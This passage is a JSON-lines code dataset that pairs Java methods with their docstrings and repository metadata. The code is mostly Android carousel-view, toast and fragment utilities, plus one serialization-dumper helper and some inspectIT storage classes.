{"docstring": "/*******************\n * Read a short field.\n ******************/\n", "func_signal": "private void readShortField()", "code": "{\n\tbyte b1, b2;\n\tb1 = this._data.pop(); b2 = this._data.pop();\n\tthis.print(\"(short)\" + (short)(((b1 << 8) & 0xff00) + (b2 & 0xff)) + \" - 0x\" + this.byteToHex(b1) + \" \" + this.byteToHex(b2));\n}", "path": "src\\nb\\barmie\\util\\SerializationDumper.java", "repo_name": "NickstaDB/BaRMIe", "stars": 681, "license": "mit", "language": "java", "size": 117}
{"docstring": "/**\n * \u89e6\u6478\u64cd\u4f5c\n *\n * @param event\n * @return\n */\n", "func_signal": "private boolean onTouch(MotionEvent event)", "code": "{\n    if (event.getAction() == MotionEvent.ACTION_DOWN) {\n        last_angle = angle;\n        touching = true;\n    }\n    boolean sc = mGestureDetector.onTouchEvent(event);\n    if (sc) {\n        this.getParent().requestDisallowInterceptTouchEvent(true);//\u901a\u77e5\u7236\u63a7\u4ef6\u52ff\u62e6\u622a\u672c\u63a7\u4ef6\n    }\n    if (event.getAction() == MotionEvent.ACTION_UP || event.getAction() == MotionEvent.ACTION_CANCEL) {\n        touching = false;\n        restPosition();\n        return true;\n    }\n    return true;\n}", "path": "loopview\\src\\main\\java\\com\\dalong\\library\\LoopViewLayout.java", "repo_name": "yixiaolunhui/LoopRotarySwitch", "stars": 803, "license": "None", "language": "java", "size": 8179}
{"docstring": "/**\n * \u8bbe\u7f6e\u65b9\u5411\n *\n * @param mOrientation\n * @return\n */\n", "func_signal": "public LoopViewLayout setOrientation(int mOrientation)", "code": "{\n    setHorizontal(mOrientation == horizontal, false);\n    return this;\n}", "path": "loopview\\src\\main\\java\\com\\dalong\\library\\LoopViewLayout.java", "repo_name": "yixiaolunhui/LoopRotarySwitch", "stars": 803, "license": "None", "language": "java", "size": 8179}
{"docstring": "/**\n * \u53d1\u9001message\n */\n", "func_signal": "private void sendMsg()", "code": "{\n    try {\n        removeMessages(MSG_WHAT);\n    } catch (Exception e) {\n    }\n    msg = createMsg();\n    this.sendMessageDelayed(msg, mLoopTime);\n}", "path": "loopview\\src\\main\\java\\com\\dalong\\library\\LoopViewHandler.java", "repo_name": "yixiaolunhui/LoopRotarySwitch", "stars": 803, "license": "None", "language": "java", "size": 8179}
{"docstring": "/**\n * \u89e6\u6478\u505c\u6b62\u8ba1\u65f6\u5668\uff0c\u62ac\u8d77\u8bbe\u7f6e\u53ef\u4e0b\u5566\u5237\u65b0\n */\n", "func_signal": "@Override\npublic boolean dispatchTouchEvent(MotionEvent ev)", "code": "{\n    onTouch(ev);\n    isCanClickListener(ev);\n    return super.dispatchTouchEvent(ev);\n}", "path": "loopview\\src\\main\\java\\com\\dalong\\library\\LoopViewLayout.java", "repo_name": "yixiaolunhui/LoopRotarySwitch", "stars": 803, "license": "None", "language": "java", "size": 8179}
{"docstring": "/**\n * \u8bbe\u7f6e\u500d\u6570\n *\n * @param mMultiple\n * @return\n */\n", "func_signal": "public LoopViewLayout setMultiple(float mMultiple)", "code": "{\n    this.multiple = mMultiple;\n    distance = multiple * r;\n    return this;\n}", "path": "loopview\\src\\main\\java\\com\\dalong\\library\\LoopViewLayout.java", "repo_name": "yixiaolunhui/LoopRotarySwitch", "stars": 803, "license": "None", "language": "java", "size": 8179}
{"docstring": "/**\n * \u662f\u5426\u53ef\u4ee5\u70b9\u51fb\u56de\u8c03\n *\n * @param event\n */\n", "func_signal": "public void isCanClickListener(MotionEvent event)", "code": "{\n    switch (event.getAction()) {\n        case MotionEvent.ACTION_DOWN:\n            x = event.getX();\n            if (autoRotation) {\n                loopHandler.removeMessages(LoopViewHandler.MSG_WHAT);\n            }\n            break;\n        case MotionEvent.ACTION_MOVE:\n            break;\n        case MotionEvent.ACTION_UP:\n        case MotionEvent.ACTION_CANCEL:\n            if (autoRotation) {\n                loopHandler.sendEmptyMessageDelayed(LoopViewHandler.MSG_WHAT, loopHandler.mLoopTime);\n            }\n            isCanClickListener = (event.getX() - x < limitX) ? true : false;\n            break;\n    }\n}", "path": "loopview\\src\\main\\java\\com\\dalong\\library\\LoopViewLayout.java", "repo_name": "yixiaolunhui/LoopRotarySwitch", "stars": 803, "license": "None", "language": "java", "size": 8179}
{"docstring": "/**\n * \u52a8\u753b\n *\n * @param finall\n * @param complete\n */\n", "func_signal": "private void AnimRotationTo(float finall, final Runnable complete)", "code": "{\n    if (angle == finall) {//\u5982\u679c\u76f8\u540c\u8bf4\u660e\u4e0d\u9700\u8981\u65cb\u8f6c\n        return;\n    }\n    restAnimator = ValueAnimator.ofFloat(angle, finall);\n    restAnimator.setInterpolator(new DecelerateInterpolator());//\u8bbe\u7f6e\u65cb\u8f6c\u51cf\u901f\u63d2\u503c\u5668\n    restAnimator.setDuration(300);\n\n    restAnimator.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {\n        @Override\n        public void onAnimationUpdate(ValueAnimator animation) {\n            if (touching == false) {\n                angle = (Float) animation.getAnimatedValue();\n                updateLoopViews();\n            }\n        }\n    });\n    restAnimator.addListener(new Animator.AnimatorListener() {\n        @Override\n        public void onAnimationStart(Animator animation) {\n        }\n\n        @Override\n        public void onAnimationEnd(Animator animation) {\n            if (touching == false) {\n                selectItem = calculateItem();\n                if (selectItem < 0) {\n                    selectItem = size + selectItem;\n                }\n                if (onItemSelectedListener != null) {\n                    onItemSelectedListener.selected(selectItem, getChildAt(selectItem));\n                }\n            }\n        }\n\n        @Override\n        public void onAnimationCancel(Animator animation) {\n\n        }\n\n        @Override\n        public void onAnimationRepeat(Animator animation) {\n\n        }\n    });\n\n    if (complete != null) {\n        restAnimator.addListener(new Animator.AnimatorListener() {\n            @Override\n            public void onAnimationStart(Animator animation) {\n\n            }\n\n            @Override\n            public void onAnimationEnd(Animator animation) {\n                complete.run();\n            }\n\n            @Override\n            public void onAnimationCancel(Animator animation) {\n\n            }\n\n            @Override\n            public void onAnimationRepeat(Animator animation) {\n\n            }\n        });\n    }\n    restAnimator.start();\n}", "path": "loopview\\src\\main\\java\\com\\dalong\\library\\LoopViewLayout.java", "repo_name": "yixiaolunhui/LoopRotarySwitch", "stars": 803, "license": "None", "language": "java", "size": 8179}
{"docstring": "/**\n * \u8bbe\u7f6e\u662f\u5426\u8981\u53d1\u9001\n *\n * @param loop\n */\n", "func_signal": "public void setLoop(boolean loop)", "code": "{\n    this.isCanLoop = loop;\n    if (loop) {\n        sendMsg();\n    } else {\n        try {\n            removeMessages(MSG_WHAT);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}", "path": "loopview\\src\\main\\java\\com\\dalong\\library\\LoopViewHandler.java", "repo_name": "yixiaolunhui/LoopRotarySwitch", "stars": 803, "license": "None", "language": "java", "size": 8179}
{"docstring": "/**\n * \u901a\u8fc7\u89d2\u5ea6\u8ba1\u7b97\u662f\u7b2c\u51e0\u4e2aitem\n *\n * @return\n */\n", "func_signal": "private int calculateItem()", "code": "{\n//        int i = (int) (angle / (360f / size)) % size;\n//        return i >= 0 ? i : i + size;\n\n    int maxIndex = 0;\n    float maxScale = 0;\n    for (int i = 0; i < size; i++) {\n        View view = getChildAt(i);\n        float scaleX = view.getScaleX();\n        if (scaleX >= maxScale) {\n            maxScale = scaleX;\n            maxIndex = i;\n        }\n    }\n    return (int) getChildAt(maxIndex).getTag();\n}", "path": "loopview\\src\\main\\java\\com\\dalong\\library\\LoopViewLayout.java", "repo_name": "yixiaolunhui/LoopRotarySwitch", "stars": 803, "license": "None", "language": "java", "size": 8179}
{"docstring": "/**\n * \u521d\u59cb\u5316view\n */\n", "func_signal": "public void initLoopViews()", "code": "{\n    reset();\n    if (mAdapter != null) {\n        size = mAdapter.getCount();\n        if (size == 0) return;\n        for (int i = 0; i < size; i++) {\n            View view = mAdapter.getView(i, getChildAt(i), this); //\u83b7\u53d6\u6307\u5b9a\u7684\u5b50view\n            final int position = i;\n            view.setTag(i);\n            addView(view);\n            view.setOnClickListener(new OnClickListener() {\n                @Override\n                public void onClick(View v) {\n                    //\u5bf9\u5b50view\u6dfb\u52a0\u70b9\u51fb\u4e8b\u4ef6\n                    if (position != selectItem) {\n                        setSelectItem(position);\n                    } else {\n                        if (isCanClickListener && onItemClickListener != null) {\n                            onItemClickListener.onItemClick(position, getChildAt(position));\n                        }\n                    }\n                }\n            });\n\n        }\n    }\n}", "path": "loopview\\src\\main\\java\\com\\dalong\\library\\LoopViewLayout.java", "repo_name": "yixiaolunhui/LoopRotarySwitch", "stars": 803, "license": "None", "language": "java", "size": 8179}
{"docstring": "/**\n * \u6392\u5e8f\n */\n", "func_signal": "private <T> void sortList(Map<Integer, Float> map)", "code": "{\n    List<Map.Entry<Integer, Float>> list = new ArrayList<Map.Entry<Integer, Float>>(map.entrySet());\n    //\u7136\u540e\u901a\u8fc7\u6bd4\u8f83\u5668\u6765\u5b9e\u73b0\u6392\u5e8f\n    Collections.sort(list, new Comparator<Map.Entry<Integer, Float>>() {\n        @Override\n        public int compare(Map.Entry<Integer, Float> o1, Map.Entry<Integer, Float> o2) {\n            return o2.getValue().compareTo(o1.getValue());\n        }\n    });\n    for (Map.Entry<Integer, Float> mapping : list) {\n        getChildAt(mapping.getKey()).bringToFront();\n    }\n\n}", "path": "loopview\\src\\main\\java\\com\\dalong\\library\\LoopViewLayout.java", "repo_name": "yixiaolunhui/LoopRotarySwitch", "stars": 803, "license": "None", "language": "java", "size": 8179}
{"docstring": "/**\n * \u6784\u9020\u65b9\u6cd5\n *\n * @param context\n * @param attrs\n * @param defStyleAttr\n */\n", "func_signal": "public LoopViewLayout(Context context, AttributeSet attrs, int defStyleAttr)", "code": "{\n    super(context, attrs, defStyleAttr);\n    this.mContext = context;\n    setGravity(Gravity.CENTER);\n    ViewConfiguration mVelocityTracker = new ViewConfiguration();\n    limitX = mVelocityTracker.getScaledTouchSlop();\n    TypedArray typedArray = context.obtainStyledAttributes(attrs, R.styleable.LoopViewLayout);\n    mOrientation = typedArray.getInt(R.styleable.LoopViewLayout_orientation, horizontal);\n    autoRotation = typedArray.getBoolean(R.styleable.LoopViewLayout_autoRotation, false);\n    r = typedArray.getDimension(R.styleable.LoopViewLayout_r, LoopR);\n    int direction = typedArray.getInt(R.styleable.LoopViewLayout_direction, 0);\n    typedArray.recycle();\n    mGestureDetector = new GestureDetector(context, getGeomeryController());\n    if (mOrientation == horizontal) {//\u5982\u679c\u662f\u6c34\u5e73 z\u503c\u4e3a0  \u5982\u679c\u662f\u7ad6\u76f4z\u503c\u4e3a90\n        loopRotationZ = 0;\n    } else {\n        loopRotationZ = 90;\n    }\n    if (direction == 0) {//\u8bbe\u7f6e\u81ea\u5b9a\u6eda\u52a8\u7684\u65b9\u5411\n        autoRotatinDirection = AutoScrollDirection.LEFT;\n    } else {\n        autoRotatinDirection = AutoScrollDirection.RIGHT;\n    }\n    loopHandler.setLoop(autoRotation);\n\n}", "path": "loopview\\src\\main\\java\\com\\dalong\\library\\LoopViewLayout.java", "repo_name": "yixiaolunhui/LoopRotarySwitch", "stars": 803, "license": "None", "language": "java", "size": 8179}
{"docstring": "/**\n * handler\u5904\u7406\n *\n * @param msg\n */\n", "func_signal": "@Override\npublic void handleMessage(Message msg)", "code": "{\n    switch (msg.what = MSG_WHAT) {\n        case MSG_WHAT:\n            if (isCanLoop) {\n                doScroll();\n                sendMsg();\n            }\n            break;\n    }\n    super.handleMessage(msg);\n}", "path": "loopview\\src\\main\\java\\com\\dalong\\library\\LoopViewHandler.java", "repo_name": "yixiaolunhui/LoopRotarySwitch", "stars": 803, "license": "None", "language": "java", "size": 8179}
{"docstring": "/**\n * \u8bbe\u7f6e\u81ea\u52a8\u5207\u6362\u65f6\u95f4\u95f4\u9694\n *\n * @param autoRotationTime\n */\n", "func_signal": "public LoopViewLayout setAutoRotationTime(long autoRotationTime)", "code": "{\n    loopHandler.setLoopTime(autoRotationTime);\n    return this;\n}", "path": "loopview\\src\\main\\java\\com\\dalong\\library\\LoopViewLayout.java", "repo_name": "yixiaolunhui/LoopRotarySwitch", "stars": 803, "license": "None", "language": "java", "size": 8179}
{"docstring": "/**\n * \u8bbe\u7f6e\u662f\u5426\u81ea\u52a8\u5207\u6362\n *\n * @param autoRotation\n */\n", "func_signal": "public LoopViewLayout setAutoRotation(boolean autoRotation)", "code": "{\n    this.autoRotation = autoRotation;\n    loopHandler.setLoop(autoRotation);\n    return this;\n}", "path": "loopview\\src\\main\\java\\com\\dalong\\library\\LoopViewLayout.java", "repo_name": "yixiaolunhui/LoopRotarySwitch", "stars": 803, "license": "None", "language": "java", "size": 8179}
{"docstring": "/**\n * \u89e6\u6478\u65b9\u6cd5\n *\n * @param event\n * @return\n */\n", "func_signal": "@Override\npublic boolean onTouchEvent(MotionEvent event)", "code": "{\n    isCanClickListener(event);\n    return true;\n}", "path": "loopview\\src\\main\\java\\com\\dalong\\library\\LoopViewLayout.java", "repo_name": "yixiaolunhui/LoopRotarySwitch", "stars": 803, "license": "None", "language": "java", "size": 8179}
{"docstring": "/**\n * \u521b\u5efamessage\n *\n * @return\n */\n", "func_signal": "public Message createMsg()", "code": "{\n    Message msg = new Message();\n    msg.what = MSG_WHAT;\n    return msg;\n}", "path": "loopview\\src\\main\\java\\com\\dalong\\library\\LoopViewHandler.java", "repo_name": "yixiaolunhui/LoopRotarySwitch", "stars": 803, "license": "None", "language": "java", "size": 8179}
{"docstring": "/**\n * \u624b\u52bf\n *\n * @return\n */\n", "func_signal": "private GestureDetector.SimpleOnGestureListener getGeomeryController()", "code": "{\n    return new GestureDetector.SimpleOnGestureListener() {\n        @Override\n        public boolean onScroll(MotionEvent e1, MotionEvent e2, float distanceX, float distanceY) {\n            angle += Math.cos(Math.toRadians(loopRotationZ)) * (distanceX / 4)\n                    + Math.sin(Math.toRadians(loopRotationZ)) * (distanceY / 4);\n            updateLoopViews();\n            return true;\n        }\n    };\n}", "path": "loopview\\src\\main\\java\\com\\dalong\\library\\LoopViewLayout.java", "repo_name": "yixiaolunhui/LoopRotarySwitch", "stars": 803, "license": "None", "language": "java", "size": 8179}
{"docstring": "/**\n * \u66f4\u65b0view\u4f4d\u7f6e\n */\n", "func_signal": "public void updateLoopViews()", "code": "{\n    int count = getChildCount();\n    Map<Integer, Float> map = new HashMap<>();\n    for (int i = 0; i < count; i++) {\n        View view = getChildAt(i);\n        float radians = angle + 180 - (float) (i * 360f / size);\n        float x0 = (float) Math.sin(Math.toRadians(radians)) * r;\n        float y0 = (float) Math.cos(Math.toRadians(radians)) * r;\n        float scale0 = (distance - y0) / (distance + r);//\u8ba1\u7b97\u5b50view\u4e4b\u95f4\u7684\u6bd4\u4f8b\uff0c\u53ef\u4ee5\u770b\u5230distance\u8d8a\u5927\u7684\u8bdd \u6bd4\u4f8b\u8d8a\u5c0f\uff0c\u4e5f\u5c31\u662f\u5927\u5c0f\u5c31\u76f8\u5dee\u8d8a\u5c0f\n        view.setScaleX(Math.max(scale0, 0.4f));//\u5bf9view\u8fdb\u884c\u7f29\u653e\n        view.setScaleY(Math.max(scale0, 0.4f));//\u5bf9view\u8fdb\u884c\u7f29\u653e\n        view.setAlpha(Math.max(scale0, 0.4f));\n        map.put((Integer) view.getTag(), scale0);\n\n        float rotationX_y = (float) Math.sin(Math.toRadians(loopRotationX * Math.cos(Math.toRadians(radians)))) * r;\n        float rotationZ_y = -(float) Math.sin(Math.toRadians(-loopRotationZ)) * x0;\n        float rotationZ_x = (((float) Math.cos(Math.toRadians(-loopRotationZ)) * x0) - x0);\n        view.setTranslationX(x0 + rotationZ_x);\n        view.setTranslationY(rotationX_y + rotationZ_y);\n    }\n    postInvalidate();\n}", "path": "loopview\\src\\main\\java\\com\\dalong\\library\\LoopViewLayout.java", "repo_name": "yixiaolunhui/LoopRotarySwitch", "stars": 803, "license": "None", "language": "java", "size": 8179}
{"docstring": "/**\n * \u590d\u4f4d\n */\n", "func_signal": "private void restPosition()", "code": "{\n    if (size == 0) {\n        return;\n    }\n    float finall = 0;\n    float part = 360f / size;//\u4e00\u4efd\u7684\u89d2\u5ea6\n    if (angle < 0) {\n        part = -part;\n    }\n    float minvalue = (int) (angle / part) * part;//\u6700\u5c0f\u89d2\u5ea6\n    float maxvalue = (int) (angle / part) * part + part;//\u6700\u5927\u89d2\u5ea6\n    if (angle >= 0) {//\u5206\u4e3a\u662f\u5426\u5c0f\u4e8e0\u7684\u60c5\u51b5\n        if (angle - last_angle > 0) {\n            finall = maxvalue;\n        } else {\n            finall = minvalue;\n        }\n    } else {\n        if (angle - last_angle < 0) {\n            finall = maxvalue;\n        } else {\n            finall = minvalue;\n        }\n    }\n    AnimRotationTo(finall, null);\n}", "path": "loopview\\src\\main\\java\\com\\dalong\\library\\LoopViewLayout.java", "repo_name": "yixiaolunhui/LoopRotarySwitch", "stars": 803, "license": "None", "language": "java", "size": 8179}
{"docstring": "/**\n * \u53d6\u6d88\u5410\u53f8\u663e\u793a\n */\n", "func_signal": "public static void cancelToast()", "code": "{\n    if (sToast != null) {\n        sToast.cancel();\n        sToast = null;\n    }\n}", "path": "lib_common\\src\\main\\java\\google\\architecture\\common\\util\\ToastUtils.java", "repo_name": "Dawish/GoogleArchitectureDemo", "stars": 730, "license": "None", "language": "java", "size": 796}
{"docstring": "/**\n * \u5224\u65ad\u4e24\u5b57\u7b26\u4e32\u662f\u5426\u76f8\u7b49\n *\n * @param a \u5f85\u6821\u9a8c\u5b57\u7b26\u4e32a\n * @param b \u5f85\u6821\u9a8c\u5b57\u7b26\u4e32b\n * @return {@code true}: \u76f8\u7b49<br>{@code false}: \u4e0d\u76f8\u7b49\n */\n", "func_signal": "public static boolean equals(CharSequence a, CharSequence b)", "code": "{\n    if (a == b) return true;\n    int length;\n    if (a != null && b != null && (length = a.length()) == b.length()) {\n        if (a instanceof String && b instanceof String) {\n            return a.equals(b);\n        } else {\n            for (int i = 0; i < length; i++) {\n                if (a.charAt(i) != b.charAt(i)) return false;\n            }\n            return true;\n        }\n    }\n    return false;\n}", "path": "lib_common\\src\\main\\java\\google\\architecture\\common\\util\\StringUtils.java", "repo_name": "Dawish/GoogleArchitectureDemo", "stars": 730, "license": "None", "language": "java", "size": 796}
{"docstring": "/**\n * \u5b89\u5168\u5730\u663e\u793a\u957f\u65f6\u5410\u53f8\n *\n * @param text \u6587\u672c\n */\n", "func_signal": "public static void showLongToastSafe(final CharSequence text)", "code": "{\n    sHandler.post(new Runnable() {\n        @Override\n        public void run() {\n            showToast(text, Toast.LENGTH_LONG);\n        }\n    });\n}", "path": "lib_common\\src\\main\\java\\google\\architecture\\common\\util\\ToastUtils.java", "repo_name": "Dawish/GoogleArchitectureDemo", "stars": 730, "license": "None", "language": "java", "size": 796}
{"docstring": "/**\n * \u66ff\u6362fragment\n * @param fragment\n * @param frameId\n */\n", "func_signal": "protected void replaceFragment(BaseFragment fragment, @IdRes int frameId)", "code": "{\n    Utils.checkNotNull(fragment);\n    getSupportFragmentManager().beginTransaction()\n            .replace(frameId, fragment, fragment.getClass().getSimpleName())\n            .addToBackStack(fragment.getClass().getSimpleName())\n            .commitAllowingStateLoss();\n\n}", "path": "lib_common\\src\\main\\java\\google\\architecture\\common\\base\\BaseActivity.java", "repo_name": "Dawish/GoogleArchitectureDemo", "stars": 730, "license": "None", "language": "java", "size": 796}
{"docstring": "/**\n * \u5b89\u5168\u5730\u663e\u793a\u957f\u65f6\u5410\u53f8\n *\n * @param resId \u8d44\u6e90Id\n * @param args  \u53c2\u6570\n */\n", "func_signal": "public static void showLongToastSafe(final @StringRes int resId, final Object... args)", "code": "{\n    sHandler.post(new Runnable() {\n        @Override\n        public void run() {\n            showToast(resId, Toast.LENGTH_LONG, args);\n        }\n    });\n}", "path": "lib_common\\src\\main\\java\\google\\architecture\\common\\util\\ToastUtils.java", "repo_name": "Dawish/GoogleArchitectureDemo", "stars": 730, "license": "None", "language": "java", "size": 796}
{"docstring": "/**\n * \u5b89\u5168\u5730\u663e\u793a\u77ed\u65f6\u5410\u53f8\n *\n * @param resId \u8d44\u6e90Id\n */\n", "func_signal": "public static void showShortToastSafe(final @StringRes int resId)", "code": "{\n    sHandler.post(new Runnable() {\n        @Override\n        public void run() {\n            showToast(resId, Toast.LENGTH_SHORT);\n        }\n    });\n}", "path": "lib_common\\src\\main\\java\\google\\architecture\\common\\util\\ToastUtils.java", "repo_name": "Dawish/GoogleArchitectureDemo", "stars": 730, "license": "None", "language": "java", "size": 796}
{"docstring": "/**\n * \u5b89\u5168\u5730\u663e\u793a\u957f\u65f6\u5410\u53f8\n *\n * @param resId \u8d44\u6e90Id\n */\n", "func_signal": "public static void showLongToastSafe(final @StringRes int resId)", "code": "{\n    sHandler.post(new Runnable() {\n        @Override\n        public void run() {\n            showToast(resId, Toast.LENGTH_LONG);\n        }\n    });\n}", "path": "lib_common\\src\\main\\java\\google\\architecture\\common\\util\\ToastUtils.java", "repo_name": "Dawish/GoogleArchitectureDemo", "stars": 730, "license": "None", "language": "java", "size": 796}
{"docstring": "/**\n * \u663e\u793afragment\n * @param fragment\n */\n", "func_signal": "protected void showFragment(BaseFragment fragment)", "code": "{\n    Utils.checkNotNull(fragment);\n    getSupportFragmentManager().beginTransaction()\n            .show(fragment)\n            .commitAllowingStateLoss();\n\n}", "path": "lib_common\\src\\main\\java\\google\\architecture\\common\\base\\BaseActivity.java", "repo_name": "Dawish/GoogleArchitectureDemo", "stars": 730, "license": "None", "language": "java", "size": 796}
{"docstring": "/**\n * \u5b89\u5168\u5730\u663e\u793a\u957f\u65f6\u5410\u53f8\n *\n * @param format \u683c\u5f0f\n * @param args   \u53c2\u6570\n */\n", "func_signal": "public static void showLongToastSafe(final String format, final Object... args)", "code": "{\n    sHandler.post(new Runnable() {\n        @Override\n        public void run() {\n            showToast(format, Toast.LENGTH_LONG, args);\n        }\n    });\n}", "path": "lib_common\\src\\main\\java\\google\\architecture\\common\\util\\ToastUtils.java", "repo_name": "Dawish/GoogleArchitectureDemo", "stars": 730, "license": "None", "language": "java", "size": 796}
{"docstring": "/**\n * Setup the toolbar.\n *\n * @param toolbar   toolbar\n * @param hideTitle \u662f\u5426\u9690\u85cfTitle\n */\n", "func_signal": "protected void setupToolBar(Toolbar toolbar, boolean hideTitle)", "code": "{\n    setSupportActionBar(toolbar);\n    ActionBar actionBar = getSupportActionBar();\n    if (actionBar != null) {\n        actionBar.setHomeAsUpIndicator(R.drawable.ic_arrow_back);\n        actionBar.setDisplayHomeAsUpEnabled(true);\n        actionBar.setDisplayShowHomeEnabled(true);\n        if (hideTitle) {\n            //\u9690\u85cfTitle\n            actionBar.setDisplayShowTitleEnabled(false);\n        }\n    }\n}", "path": "lib_common\\src\\main\\java\\google\\architecture\\common\\base\\BaseActivity.java", "repo_name": "Dawish/GoogleArchitectureDemo", "stars": 730, "license": "None", "language": "java", "size": 796}
{"docstring": "/**\n * \u5b89\u5168\u5730\u663e\u793a\u77ed\u65f6\u5410\u53f8\n *\n * @param format \u683c\u5f0f\n * @param args   \u53c2\u6570\n */\n", "func_signal": "public static void showShortToastSafe(final String format, final Object... args)", "code": "{\n    sHandler.post(new Runnable() {\n        @Override\n        public void run() {\n            showToast(format, Toast.LENGTH_SHORT, args);\n        }\n    });\n}", "path": "lib_common\\src\\main\\java\\google\\architecture\\common\\util\\ToastUtils.java", "repo_name": "Dawish/GoogleArchitectureDemo", "stars": 730, "license": "None", "language": "java", "size": 796}
{"docstring": "/**\n * \u5f39\u51fa\u6808\u9876\u90e8\u7684Fragment\n */\n", "func_signal": "protected void popFragment()", "code": "{\n    if (getSupportFragmentManager().getBackStackEntryCount() > 1) {\n        getSupportFragmentManager().popBackStack();\n    } else {\n        finish();\n    }\n}", "path": "lib_common\\src\\main\\java\\google\\architecture\\common\\base\\BaseActivity.java", "repo_name": "Dawish/GoogleArchitectureDemo", "stars": 730, "license": "None", "language": "java", "size": 796}
{"docstring": "/**\n * \u5b57\u7b26\u4e32\u62fc\u63a5,\u7ebf\u7a0b\u4e0d\u5b89\u5168,\u6548\u7387\u9ad8\n */\n", "func_signal": "public static String builder(String... array)", "code": "{\n    StringBuilder s = new StringBuilder();\n    for (String str : array) {\n        s.append(str);\n    }\n    return s.toString();\n}", "path": "lib_common\\src\\main\\java\\google\\architecture\\common\\util\\StringUtils.java", "repo_name": "Dawish/GoogleArchitectureDemo", "stars": 730, "license": "None", "language": "java", "size": 796}
{"docstring": "/**\n * \u5b89\u5168\u5730\u663e\u793a\u77ed\u65f6\u5410\u53f8\n *\n * @param text \u6587\u672c\n */\n", "func_signal": "public static void showShortToastSafe(final CharSequence text)", "code": "{\n    sHandler.post(new Runnable() {\n        @Override\n        public void run() {\n            showToast(text, Toast.LENGTH_SHORT);\n        }\n    });\n}", "path": "lib_common\\src\\main\\java\\google\\architecture\\common\\util\\ToastUtils.java", "repo_name": "Dawish/GoogleArchitectureDemo", "stars": 730, "license": "None", "language": "java", "size": 796}
{"docstring": "/**\n * \u6dfb\u52a0fragment\n *\n * @param fragment\n * @param frameId\n */\n", "func_signal": "protected void addFragment(BaseFragment fragment, @IdRes int frameId)", "code": "{\n    Utils.checkNotNull(fragment);\n    getSupportFragmentManager().beginTransaction()\n            .add(frameId, fragment, fragment.getClass().getSimpleName())\n            .addToBackStack(fragment.getClass().getSimpleName())\n            .commitAllowingStateLoss();\n\n}", "path": "lib_common\\src\\main\\java\\google\\architecture\\common\\base\\BaseActivity.java", "repo_name": "Dawish/GoogleArchitectureDemo", "stars": 730, "license": "None", "language": "java", "size": 796}
{"docstring": "/**\n * \u9996\u5b57\u6bcd\u5927\u5199\n *\n * @param s \u5f85\u8f6c\u5b57\u7b26\u4e32\n * @return \u9996\u5b57\u6bcd\u5927\u5199\u5b57\u7b26\u4e32\n */\n", "func_signal": "public static String upperFirstLetter(String s)", "code": "{\n    if (isEmpty(s) || !Character.isLowerCase(s.charAt(0))) return s;\n    return String.valueOf((char) (s.charAt(0) - 32)) + s.substring(1);\n}", "path": "lib_common\\src\\main\\java\\google\\architecture\\common\\util\\StringUtils.java", "repo_name": "Dawish/GoogleArchitectureDemo", "stars": 730, "license": "None", "language": "java", "size": 796}
{"docstring": "/**\n * \u79fb\u9664fragment\n * @param fragment\n */\n", "func_signal": "protected void removeFragment(BaseFragment fragment)", "code": "{\n    Utils.checkNotNull(fragment);\n    getSupportFragmentManager().beginTransaction()\n            .remove(fragment)\n            .commitAllowingStateLoss();\n\n}", "path": "lib_common\\src\\main\\java\\google\\architecture\\common\\base\\BaseActivity.java", "repo_name": "Dawish/GoogleArchitectureDemo", "stars": 730, "license": "None", "language": "java", "size": 796}
{"docstring": "/**\n * \u5b57\u7b26\u4e32\u62fc\u63a5,\u7ebf\u7a0b\u5b89\u5168\n */\n", "func_signal": "public static String buffer(String... array)", "code": "{\n    StringBuffer s = new StringBuffer();\n    for (String str : array) {\n        s.append(str);\n    }\n    return s.toString();\n}", "path": "lib_common\\src\\main\\java\\google\\architecture\\common\\util\\StringUtils.java", "repo_name": "Dawish/GoogleArchitectureDemo", "stars": 730, "license": "None", "language": "java", "size": 796}
{"docstring": "/**\n * \u9690\u85cffragment\n * @param fragment\n */\n", "func_signal": "protected void hideFragment(BaseFragment fragment)", "code": "{\n    Utils.checkNotNull(fragment);\n    getSupportFragmentManager().beginTransaction()\n            .hide(fragment)\n            .commitAllowingStateLoss();\n\n}", "path": "lib_common\\src\\main\\java\\google\\architecture\\common\\base\\BaseActivity.java", "repo_name": "Dawish/GoogleArchitectureDemo", "stars": 730, "license": "None", "language": "java", "size": 796}
{"docstring": "/**\n * \u5b89\u5168\u5730\u663e\u793a\u77ed\u65f6\u5410\u53f8\n *\n * @param resId \u8d44\u6e90Id\n * @param args  \u53c2\u6570\n */\n", "func_signal": "public static void showShortToastSafe(final @StringRes int resId, final Object... args)", "code": "{\n    sHandler.post(new Runnable() {\n        @Override\n        public void run() {\n            showToast(resId, Toast.LENGTH_SHORT, args);\n        }\n    });\n}", "path": "lib_common\\src\\main\\java\\google\\architecture\\common\\util\\ToastUtils.java", "repo_name": "Dawish/GoogleArchitectureDemo", "stars": 730, "license": "None", "language": "java", "size": 796}
{"docstring": "/**\n * {@inheritDoc}\n */\n", "func_signal": "@Override\npublic String[] getStringValues(InvocationSequenceData invocSequence, ICachedDataService cachedDataService)", "code": "{\n\tMethodIdent mIdent = cachedDataService.getMethodIdentForId(invocSequence.getMethodIdent());\n\tif (null != mIdent) {\n\t\treturn new String[] { mIdent.getFullyQualifiedMethodSignature() };\n\t} else {\n\t\treturn new String[0];\n\t}\n}", "path": "inspectit.shared.cs\\src\\main\\java\\rocks\\inspectit\\shared\\cs\\ci\\business\\valuesource\\impl\\MethodSignatureValueSource.java", "repo_name": "inspectIT/inspectIT", "stars": 534, "license": "None", "language": "java", "size": 18280}
{"docstring": "/**\n * {@inheritDoc}\n */\n", "func_signal": "@Override\npublic IStorageTreeComponent<E> getNextTreeComponent(E object)", "code": "{\n\tif (null != childIndexer) {\n\t\t// if there is child indexer we need to create a branch\n\n\t\tif (!childIndexer.isPassId() && !passId) {\n\t\t\t// if child is not shared and we don't need to pass id\n\t\t\t// just create new branch with child indexer\n\t\t\treturn new StorageBranch<>(childIndexer);\n\t\t} else {\n\t\t\t// create new instance of child indexer and pass id if necessary\n\t\t\tIStorageBranchIndexer<E> indexer = childIndexer.getNewInstance();\n\t\t\tif (passId) {\n\t\t\t\tindexer.setId(id);\n\t\t\t}\n\t\t\treturn new StorageBranch<>(indexer);\n\t\t}\n\t} else {\n\t\t// if not we need to create Leaf, and pass id is necessary\n\t\tif (object instanceof InvocationSequenceData) {\n\t\t\t// for invocations ArrayBasedStorageLeaf\n\t\t\tif (passId) {\n\t\t\t\treturn new ArrayBasedStorageLeaf<>(id);\n\t\t\t} else {\n\t\t\t\treturn new 